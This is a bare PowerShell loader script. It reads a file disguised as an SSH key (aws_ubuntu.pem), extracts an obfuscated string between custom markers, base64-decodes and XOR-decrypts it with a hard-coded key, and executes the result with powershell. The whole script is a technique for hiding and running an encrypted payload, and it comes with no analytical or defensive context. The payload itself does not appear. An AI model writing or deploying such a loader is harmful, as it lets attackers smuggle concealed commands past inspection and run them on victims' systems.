function Xor-Decryption ($EncryptedText, $Key) {
    $paddingLength = (4 - ($EncryptedText.Length % 4)) % 4
    $EncryptedText = $EncryptedText + ('=' * $paddingLength)
    $encryptedBytes = [System.Convert]::FromBase64String($EncryptedText)
    $keyBytes = [System.Text.Encoding]::UTF8.GetBytes($Key)

    $decryptedBytes = New-Object 'byte[]' $encryptedBytes.Count
    for ($i = 0; $i -lt $encryptedBytes.Count; $i++) {
        $decryptedBytes[$i] = $encryptedBytes[$i] -bxor $keyBytes[$i % $keyBytes.Count]
    }

    return [System.Text.Encoding]::UTF8.GetString($decryptedBytes)

}

function Parse-EncryptedString ($inputstring) {
    
    $fakePEM_string = $inputstring -replace "`n" -replace "`r"
    $pattern = "(?<=HaFfa).*?(?=Da7)"
    $match = [regex]::Match($fakePEM_string, $pattern)

    if ($match.Success) {
        return $match.Value
    } else {
        throw "The input string does not contain the expected delimiters (HaFfa and Da7)."
    }
}
$key = "us-east"
$fakePEM = Get-Content -path aws_ubuntu.pem -raw
$encrypted = (Parse-EncryptedString -inputString $fakePEM) -replace ' ',''
$decrypted = Xor-Decryption -EncryptedText $encrypted -replace '=','' -Key $key
powershell($decrypted)
